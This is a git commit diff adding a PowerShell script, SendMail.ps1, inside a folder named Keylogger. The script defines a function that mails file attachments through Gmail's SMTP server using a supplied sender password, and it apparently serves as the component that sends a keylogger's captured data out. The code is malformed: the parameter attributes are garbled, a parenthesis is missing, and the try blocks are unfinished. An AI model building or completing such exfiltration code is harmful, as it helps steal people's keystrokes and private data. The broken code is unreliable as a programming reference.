3b8077513172ac3dc4f7d9574fbf5f41700159f1
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-06 22:51:02 +0800

    Created PowerShell Script

---
+++ Keylogger/SendMail.ps1
@@ -0,0 +1,46 @@
+﻿Param( [String]$Att,
+       [String]$Subj,
+       [String]$Body
+       )
+
+Function Send-Email
+{
+    Param(
+                [Parameter('
+                Mandatory=$true')]
+            [String]$To,
+                [Parameter('
+                Mandatory=$true')]
+            [String]$From,
+                [Parameter('
+                Mandatory=$true')]
+            [String]$Password,
+                [Parameter('
+                Mandatory=$true')]
+            [String]$Subject,
+                [Parameter('
+                Mandatory=$true')]
+            [String]$Body,
+                [Parameter('
+                Mandatory=$true')]
+            [String]$attachment
+            )
+try 
+{
+    $Msg = New-Object System.Net.Mail.MailMessage($From,$To,$Subject,$Body)
+    $Srv = "smtp.gmail.com"
+    if($attachment -ne $null) 
+    {
+        try
+        {
+            $Attachments = $attachment -split ("\:\:");
+            forEach($val in $Attachments)
+            {
+                $attch = New-Object System.Net.Mail.Attachment($val)
+                $Msg.Attachments.Add($attch
+            }
+        }
+    }
+}
+
+}           
